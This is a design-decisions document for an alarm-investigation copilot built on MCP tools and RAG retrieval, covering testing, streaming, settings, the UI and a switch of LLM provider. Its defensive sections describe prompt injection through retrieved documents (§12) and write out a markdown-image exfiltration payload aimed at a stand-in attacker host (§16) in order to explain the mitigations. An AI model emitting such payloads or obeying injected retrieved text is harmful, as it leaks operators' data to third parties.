# Design decisions

The choices that would have gone differently under different reasoning, each with what was
rejected and why. Decisions whose rationale lives better next to the code (RRF's `k`, the relevance
threshold, the chunking rule) are cross-referenced rather than repeated.

---

## 1. RAG is a tool in the same catalogue, not a second pipeline

**Decision.** The planner sees one catalogue: the MCP-discovered alarm tools plus a local
`search_procedures` tool. The model chooses among them in a single loop.

**Rejected:** a separate retrieval step that always runs before or after the alarm calls; and
wrapping retrieval in a second MCP server.

**Why.** The assignment requires MCP and RAG in *one* business workflow and names "MCP and RAG
demonstrated separately" as a red flag. A fixed pre- or post-retrieval step would satisfy it on
paper while being two pipelines with a join at the end. Putting retrieval in the catalogue makes the
integration structural: the model cannot help but interleave them, and
`tests/unit/test_registry.py` asserts that one `discover()` returns both with one shape, so a future
split into two catalogues fails a test rather than passing review.

Retrieval stayed *local* rather than becoming a second MCP server because the constraint is
one-directional — the *alarm API* must be reached only through MCP; nothing says retrieval must be.
A second server would have added a process, a transport and a failure mode to demonstrate a pattern
the first server already demonstrates. What it would have bought is trivial replacement of the
retrieval backend, which the `LocalTool` interface already provides in-process.

## 2. Two planner paths behind one interface

**Decision.** `LLMProvider` with a native tool-calling path and a JSON-planner fallback that
prompts for `{"tool_calls": [{"name", "arguments"}]}`. A one-off probe (`scripts/probe_llm.py`)
sets `LLM_NATIVE_TOOLS`; the orchestrator is identical either way.

**Rejected:** committing to native tool calling and finding out late.

**Why.** A provider's native tool protocol is not something to assume. This project was first
written against Claude on a Databricks AI gateway whose `tools` support was never verifiable — the
only token available had to be treated as compromised — and the whole orchestration loop depends on
tool selection, so that unknown sat directly under the critical path. Two paths behind one
interface converts a blocking risk into a configuration flag.

It then paid for itself twice. Moving to Gemini did not just change a base URL: Gemini validates
tool schemas against its own Schema proto and **rejects** an unknown key rather than ignoring it,
so a Pydantic-generated schema returns `400 Unknown name "additionalProperties"` until it is
translated (§22). Had there been one path, that would have been a hard stop rather than a flag
flip while the translator was written. What the arrangement must not become is one real path and
one that has never run, so the JSON protocol is what the whole suite exercises through
`ScriptedProvider`, whichever path serves a live question.

## 3. The e2e test uses a scripted model; the real provider is a separate script

**Decision.** `tests/e2e` runs the real simulator, the real MCP server over a real MCP client, the
real index and the real HTTP surface — with `ScriptedProvider` in place of the model.
`scripts/live_smoke.py` runs the same question against the real model, marked `live` and excluded
from `make test`.

**Rejected:** an e2e test that calls the real model.

**Why.** The headline test has to be runnable in CI by a reviewer with no token, and it has to fail
for a reason. A test whose fixture is a language model's mood is a test that gets re-run until it
passes, which is worse than no test. Scripting the *model* while keeping every other layer real
puts the determinism exactly where the nondeterminism was, and the acceptance scenario is defined
once in `tests/scenario.py` so the integration and e2e layers cannot drift apart.

This is also what makes the layer honest about what it does not cover: whether a real model chooses
the right tools. That is what `make smoke` and the demo video are for.

## 4. Trace events stream; the answer does not

**Decision.** `POST /chat` streams one SSE event per traced step as it happens, then one final
`answer` event. The answer text is not streamed token by token.

**Rejected:** streaming the answer.

**Why.** The answer is post-processed before it may be shown: every `[DOC §N]` marker is resolved
against the evidence actually retrieved, and anything that resolves to nothing is recorded in
`invented_references` and neutralised. That check cannot run on half a sentence. Streaming would
mean either publishing an unchecked citation and correcting it a second later — in a safety context,
the worse option — or buffering everything and merely appearing to stream. Streaming the *trace*
delivers the thing the perceived-latency argument is actually about: the user watches
`search_assets → get_recurring_alarms → search_procedures` appear, and a twenty-second
investigation stops looking like a hang.

## 5. `fetch` and a hand-written SSE parser, not `EventSource`

**Decision.** The GUI parses SSE framing itself over `fetch`.

**Rejected:** `EventSource`.

**Why.** `EventSource` can only issue a GET. Making `/chat` a GET with the question in the query
string would put operator text into server access logs and cap it at the URL length. The parser is
about twenty lines and buys an abortable POST.

It also has to be right about one thing that is easy to get wrong: the blank line between events may
be `\r\n\r\n`, `\n\n` or `\r\r`, and sse-starlette emits the first. A parser splitting on `'\n\n'`
finds no boundary at all in a CRLF stream — a blank screen with no error, while every backend test
stays green. This was a real bug, caught by `tests/e2e` asserting against the server's actual
framing rather than a reconstruction of it.

## 6. Both MCP transports from one codebase

**Decision.** `--transport stdio|streamable-http`. HTTP on `:9100/mcp` is the runtime default;
tests use an in-memory client session.

**Why.** The assignment's own compose file names `MCP_SERVER_URL=http://alarm-mcp:9000`, so HTTP is
what "independently runnable service" means here, and it is curl-able for the demo. The port is the
one place this repo departs from that line: 9000 is already held on the build machine, so 9100 is
the default everywhere — `.env`, the `McpSettings` default, the `Makefile` and compose — because a
repo with two MCP port numbers in it is how a client ends up dialling a port nothing bound. stdio is what
MCP Inspector and Claude Desktop speak, which makes the server inspectable by a reviewer with tools
they already have. Tests use neither: an in-memory session removes a port, a process and a race
from every test that only cares about tool behaviour. All three exercise the same server object.

## 7. A session per request, not one long-lived MCP session

**Decision.** The backend opens an MCP session per request and closes it after.

**Rejected:** one session for the process lifetime.

**Why.** The MCP client owns an anyio task group whose lifetime is tied to the scope that created
it; holding one open across requests means owning that scope in a FastAPI lifespan and reasoning
about cancellation when a client disconnects mid-stream. The cost is one connection setup per
question — tens of milliseconds against a multi-second investigation. It also happens to be why the
degraded scenario behaves well: a stopped MCP server produces a `ConnectionError` at session open,
which is a caught degradation, rather than a stale session failing later inside a tool call.

The tradeoff is real and is listed in [`known-limitations.md`](known-limitations.md).

## 8. A tool failure is data, not an abort

**Decision.** Every tool outcome — including failures — goes back into the conversation. The loop
continues. `registry.call` never raises.

**Why.** The upstream API can be down, an asset id can be wrong, a window can be empty. An
orchestrator that raised on the first failure would produce nothing in exactly the situations where
an operator most needs whatever is known. Feeding the failure back lets the model correct an
argument, take another route, or conclude with a partial picture and say so. This is what makes the
degraded scenario answer from documentation alone with `MCP_UNREACHABLE` in its caveats instead of
returning a 500.

## 9. The loop is bounded by construction

**Decision.** `ORCHESTRATOR_MAX_STEPS=8` iterations, `MAX_CALLS_PER_STEP` per iteration. Hitting
the ceiling is not an error — the answer is written from what was gathered, with
`steps_exhausted: true`.

**Why.** A model that keeps investigating rather than concluding is not hypothetical; it is the
normal consequence of tools that keep returning almost-but-not-quite enough. Unbounded, one question
becomes an open-ended bill against a metered gateway. Treating the ceiling as an error instead
would throw away a partial answer that is usually still useful.

## 10. Abstention is decided on cosine, ranking on RRF

**Decision.** Order comes from reciprocal-rank fusion; the low-confidence decision comes from the
best dense cosine against a measured threshold.

**Why.** RRF discards magnitudes, so it cannot support a quality threshold — whatever ranks first
scores the same whether its cosine was 0.85 or 0.41. Ranking needs relative order; abstention needs
an absolute signal. They are different questions and are answered from different numbers. The
threshold is measured on this corpus, not chosen, and the measurement is asserted in a test so it
stays a measurement. Full reasoning, including why BM25 is excluded from the decision:
[`rag-design.md` §12](rag-design.md) and `RagSettings.min_relevance`.

## 11. A pinned citation carries no score

**Decision.** A section fetched by name gets `score: null` and `selected_by: "reference"`, not the
1.0 the internal ranking uses.

**Why.** Nothing measured a relevance for it. Rendering the internal 1.0 in the GUI would present a
passage that no similarity search corroborated as the *strongest* evidence found. `null` plus
`selected_by` says what actually happened, and the GUI shows "cited upstream". The same reasoning
gives `ChunkScores.synthetic` its existence.

## 12. Sanitise at ingestion *and* wrap at prompt assembly

**Decision.** Both, and neither is presented as sufficient.

**Why.** Ingestion-time stripping is the stronger control — text never stored cannot be retrieved —
but it is pattern-based and cannot be complete; a novel phrasing will pass. Prompt-assembly wrapping
covers what the sanitiser missed and keeps holding if a document is added later without going
through ingestion. Schema validation of every tool call is the third layer: retrieved text cannot
invent a tool or a parameter even if a model repeated one. Each layer is cheap; the combination is
what makes the claim defensible rather than aspirational.

## 13. Redact on the way in, not on the way out

**Decision.** `TraceEvent.detail` is redacted when the event is recorded.

**Why.** `GET /trace/{id}` publishes whatever was recorded, and it is unauthenticated because this
is a local demo. Redacting at the exit would mean every future reader of the store — a log sink, a
debug print, a test that dumps a fixture — is a new place to get it wrong. Redacting at the entrance
makes the store itself safe. The same reasoning splits the retrieval payloads: the model-facing and
trace-facing objects are built from *different fields*, so a document body cannot reach the trace by
omission.

## 14. Four settings classes, one `.env`, an alias on every field

**Decision.** `alarm_api`, `connectors`/MCP, `backend` and `rag` each have their own
`BaseSettings`, reading the same `.env`, and every field declares an explicit alias.

**Why.** The separation is what makes "the simulator and the MCP server cannot leak the LLM
credential" structural: their settings classes cannot express one. The aliases are not style — an
un-aliased field named `path` or `host` resolves from an environment variable that already exists in
any shell, and the resulting bug is invisible to an in-process test. It cost real time on the MCP
server, where `MCP_SERVER_PATH` silently became `$PATH`.

## 15. A simulator in the repo

**Decision.** `apps/alarm_api` implements the source system, seeded relative to now.

**Why.** The real API is not reachable from this machine, and the acceptance scenario has to be
assertable. The alternative — mocking at the connector boundary — would have left the MCP server's
retry, pagination and error-mapping behaviour untested against anything resembling a real service,
which is 20% of the grade. The simulator is an addition to the mandated repo structure, which the
guidelines permit when documented; everything above it is written against the contract, so
`ALARM_API_BASE_URL` is the only thing that changes to point at production.

## 16. The answer's markdown is rendered, but images and links are not

**Decision.** `react-markdown` + `remark-gfm` + `remark-breaks` build React elements from the
answer. `rehype-raw` is deliberately absent, and `img` and `a` are overridden to render as text.

**Rejected.** Pre-wrapped plain text, which is what this was first. Also: `dangerouslySetInnerHTML`
with a sanitiser; and hand-writing a markdown renderer, as was done for the SSE parser.

**Why.** The synthesis prompt asks for four headings, ordered actions and a table of alarm counts —
the densest, most scannable part of the answer, and exactly what arrives as literal `##` and
`|---|---|` when rendered as text. But the answer is model output built partly from retrieved
documents, so the browser is the last place an injected payload could execute. Elements from a
syntax tree keep both: there is no HTML string to sanitise, so no sanitiser to get wrong, and raw
HTML in the markdown is simply not rendered. A hand-written renderer would have been ~150 lines of
GFM table edge cases needing a suite of their own to hold them — the wrong place to spend the
dependency budget the SSE parser was worth spending. (The frontend does now have a test runner, but
it is pointed at the conversation state machine, which is where this app's own logic lives.)

Images and links go further than markdown safety requires, because both let a URL in the answer
reach a third party: `![](https://attacker/?d=…)` is fetched on render with no click at all. Neither
is needed — nothing in this corpus is a hyperlink — so both render as visible text instead. A
stripped image and a de-linked URL are evidence about the answer, which is why they are marked
rather than dropped silently.

## 17. The KPI board is a projection of tool results, not a second source of truth

**Decision.** `apps/backend/orchestration/kpis.py` walks the same `ToolOutcome` list the answer was
written from and lifts the numbers out of it into a typed `InvestigationKpis` on the answer. The
GUI formats them. Nothing is computed in either place.

**Rejected:** computing the KPIs in the backend from the alarm rows; and having the browser read
them out of the raw trace payloads.

**Why.** An operator acts on the biggest number on the screen. If the tile says 42 and the
paragraph under it says 38, the copilot has produced two claims and no way to choose between them —
and that is the *likely* outcome of recomputing, because a tile computed from a paginated
`get_alarms` page counts a different set from the KPI the alarm API computed over the whole window.
Lifting means the tile and the prose are the same number by construction. It also keeps the
arithmetic where the data is: the API has every row in hand, the backend has one page.

The corollary is the rule the tests spend most of their assertions on: **a KPI no tool returned is
absent, not zero.** `avg_ack_delay: null` means nothing in the set was acknowledged, which is not
"acknowledged in 0 minutes", and a documentation-only question renders no board at all rather than
a row of zeroes. In an alarm application a zero is read as "someone checked, and it is clear",
which is the most expensive thing this screen could get wrong.

Tile colour is the one judgement made here rather than lifted, and it is confined to `_TONE` —
presentation only, never the answer text, never a caveat. The value and its unit are always printed
beside the colour, because colour alone does not survive a projector or a screen reader.

## 18. `get_alarm_summary` defaults to a broad KPI set, not a bare count

**Decision.** Omitting `kpis` computes seven — volume, severity, recurrence and operator response
— instead of `["alarm_count"]`.

**Why.** Two reasons, one for each consumer. A model asking "how bad is this" almost always wants
severity and response quality alongside the count, and leaving it to name them costs a round trip
once it realises; all ten KPIs come from one already-loaded set of rows upstream, so the extra ones
are free. And the GUI's KPI header is assembled from whatever this returns, so a single-count
default would make the board depend on the model's choice of arguments — the same question could
produce one tile or eight, which is not a dashboard. A caller that wants less still passes `kpis`
explicitly, and `tests/integration/test_mcp_server.py` pins both paths.

## 19. Conversation memory stores the delivered turn, and it is context rather than evidence

**Decision.** `apps/backend/orchestration/memory.py` keeps, per conversation, the last
`CONVERSATION_TURNS=4` *delivered* turns — the operator's question, the answer, the references it
cited. That history is rendered into one **system** message and inserted ahead of both the planning
and the synthesis prompts, headed "This is context, not evidence" and instructing the model to call
the tools again rather than treat an earlier figure as established.

**Rejected.** Replaying the planning transcript — the user/assistant/tool-result turns of the
previous investigation — which is what a chat framework would do by default. Also rejected: keeping
the history in the browser and sending it up with each question.

**Why.** Three reasons for not replaying the transcript. Tool payloads are the largest thing in the
loop, and carrying them forward multiplies the cost of every follow-up by the length of the thread.
The passages in them were already citation-checked once, and re-feeding them invites the model to
answer from memory rather than from a fresh retrieval — the citation enforcement in `synthesis.py`
cannot tell the difference. And the assistant turns of a planning loop are protocol JSON; putting
them in front of a model asked for prose is teaching it the wrong shape of reply.

What this buys is a testable property: because nothing but the delivered text crosses the turn
boundary, and because that text arrives labelled as context, a claim in a follow-up answer cannot be
sourced from a previous answer. It has to come from a document or an API, on this turn.
`tests/integration/test_orchestrator.py::TestAConversationOfSeveralQuestions` asserts the history
reaches both prompts, carries the label, and is bounded.

The history stays server-side because it is what the model is shown. A client that could edit it
could rewrite what the copilot believes about the plant, and the browser holding the authoritative
copy would also mean a reload silently changes it. The client keeps one opaque `conversation_id`;
`CopilotAnswer.history_turns` is how it can still show the operator that context was carried.

## 20. The screen is one viewport, and the regions scroll rather than the page

**Decision.** `.app` is a `100dvh` two-row grid — brand bar, then the two columns — with
`body { overflow: hidden }` above 1100px. Everything that can outgrow its share scrolls inside
itself: the conversation thread, the evidence column, and each raw request/response block. The
composer is a grid row, not a sticky element, so it is pinned by the layout. Below 1100px the rule
inverts: the columns stack, the document scrolls normally, and the thread takes a `70vh` cap.

**Rejected.** A normally scrolling document with a sticky header and composer, which is what this
was first. Also rejected: `max-height: calc(100vh - 330px)` on the thread — the arithmetic that
version needed to keep the composer on screen.

**Why.** This is an operator's screen, and the two things it must never lose are the health badge
(which says whether MCP is reachable at all) and the input. A page scroll takes both away exactly
when the answer gets long, which is when they matter. Scrolling the thread instead also keeps the
execution trace fixed beside the answer it belongs to, so a reviewer can read one against the other
without the two moving independently — the whole point of putting the trace in a column rather than
behind a tab (§3.7 of [`solution-overview.md`](solution-overview.md)).

The `calc()` was a magic number against the viewport that drifted every time the header gained a
line; a real grid row cannot drift. `100dvh` rather than `100vh` because a mobile browser's
collapsing toolbar would otherwise cut the composer off. And the 1100px escape hatch exists because
one viewport is a good rule for a control-room display and a bad one for a laptop in portrait — at
that width there is not enough height left to give a thread and a trace a usable share each.

Verified by driving the running GUI over the DevTools protocol at 900×800, 1280×720 and 1512×900:
at the two larger sizes `document.documentElement.scrollHeight` equals `innerHeight` with two real
turns in the thread (thread `scrollHeight` ≈ 7000px inside a ≈ 590px box), and at 900px wide the
document scrolls as intended.

## 21. The brand is red, informational accents are not — and the chat is one panel

**Decision.** Two separate hues. `--accent` / `--brand` (`#b01f2f`, `#8a1c2b`) carry everything that
is *chrome or action*: the bar, the primary button, links, focus rings, the selected chip. A second,
deliberately un-branded blue (`--info`, `#1461c4`) carries everything that is *informational*: the
"working" notice, the `mcp` backend tag, the spinner. Error red stays where it was.

The left column is **one card**, not a stack of panels: `.chat` is a three-row grid — header, the
scrolling thread, the composer — and the panels that used to nest inside it are flattened
(`.chat__scroll .panel { padding: 0; background: none; border: 0 }`). An empty thread renders a
short greeting with three clickable example questions, and the composer's box is always empty.

**Rejected.** Letting the brand red do both jobs. Also rejected: the previous opening screen — a
"No questions yet" card explaining that this is a conversation rather than a single-shot form, plus
a composer that opened pre-filled with the 180-character acceptance question and offered the same
three questions again as opener chips.

**Why.** A red brand collides with error semantics: a red `mcp` tag beside a red `error` tag is one
colour meaning two things, on the screen where "did this step fail?" is the first question a reviewer
asks. Splitting the hues costs three tokens and keeps that read unambiguous.

The single card is what makes the left column read as a chat. Three bordered panels stacked in a
column read as three unrelated widgets, and nesting a panel inside a panel put two borders around
the same content.

And the opening copy tells the operator *what to ask* instead of explaining the UI to them. A visitor
does not need to be told that a chat is a conversation; they need a question they can click. The
three examples cover one capability each — an alarm investigation, a procedure lookup, and one the
corpus cannot answer, whose "no documented evidence" reply is worth seeing — so the opening screen
doubles as the fastest tour of what the copilot does. Dropping the prefill matters for the same
reason: it saved the demo some typing and cost everyone else a wall of text to read and delete.

Verified by driving the running GUI: 16 GUI tests pass (two of them new — that the box opens empty,
and that clicking an example asks it), and the one-viewport measurements of §20 still hold with the
new layout at 1512×900 and 900×800.

## 22. The LLM was replaced late, and the seam is what made that a one-directory change

**Decision.** Swap Claude-on-Databricks for Gemini via Google's Generative Language API, called
over the `httpx` this project already depends on. `apps/backend/llm/databricks.py` was deleted
rather than kept alongside.

**Rejected:** keeping both providers; using an OpenAI-compatible shim in front of Gemini.

**Why.** A free API key with no expiry beats a corporate token that has to be rotated by hand
before a reviewer can run anything, and "two providers" would have meant one of them permanently
untested. The shim was rejected because the compatibility layer hides exactly the things that
turned out to matter below.

**What the swap actually cost**, all four verified against the live endpoint rather than read off
a doc page:

| Accommodation | Why |
|---|---|
| A JSON Schema → Gemini Schema translator (`_gemini_schema`) | Gemini validates `parameters` against its own proto and **rejects** an unknown key. The MCP server's schemas come from Pydantic carrying `title`, `default`, `minimum`, `exclusiveMinimum`, `additionalProperties`; forwarding them returns `400 Unknown name "additionalProperties" … Cannot find field` |
| `anyOf: [X, {"type": "null"}]` → `X` + `nullable: true` | How Pydantic spells every optional argument; Gemini's type enum has no `NULL` member, so without the collapse almost no tool in the catalogue can be advertised at all |
| `$ref` inlining, with `$defs` threaded down the recursion | Gemini has no `$ref`. Pydantic puts `$defs` at the top level and the reference inside `properties` — read the definitions from the referring node and every nested model silently becomes "accepts anything" |
| `user`/`model` roles, `systemInstruction`, merged adjacent turns | There is no `assistant` role and no `system` turn, and `contents` is documented to alternate — which two tool results in one step would otherwise break |

The translator is deliberately **lossy**: a bound Gemini cannot express is dropped rather than
sent, because the alternative is a 400 that fails the whole question. Nothing is weakened by
that — every argument is validated against the *original* schema in the planner before a tool
runs, so what the model is shown is a hint and the enforcement is somewhere this cannot reach.

Two operational notes worth having in one place. The free tier answers `503 This model is
currently experiencing high demand` under load, so `_post` retries `429`/`5xx` with `Retry-After`
honoured and capped (`LLM_MAX_RETRIES`). And the 2.5-series spends output tokens on hidden
reasoning before writing anything, so a budget that looks generous can return `finishReason:
MAX_TOKENS` with an empty answer — `GEMINI_THINKING_BUDGET=0` is the fix, and `stop_reason` is
surfaced in the trace so the symptom is visible rather than mysterious.

The key travels in an `x-goog-api-key` **header**, not the `?key=` query parameter Google's own
examples use: a URL reaches proxy logs, exception messages and `httpx` request reprs, and this
project asserts the credential appears in none of them.

**What did not change:** `orchestration/`, `tracing/`, `api/`, the GUI, and every test above the
provider. That is the claim §2's interface was built to support, now demonstrated rather than
asserted — the one thing it cost outside `apps/backend/llm/` was a `provider: 'gemini'` string in
a GUI test fixture.

---

Where the consequences of these choices show up as gaps, they are listed in
[`known-limitations.md`](known-limitations.md).
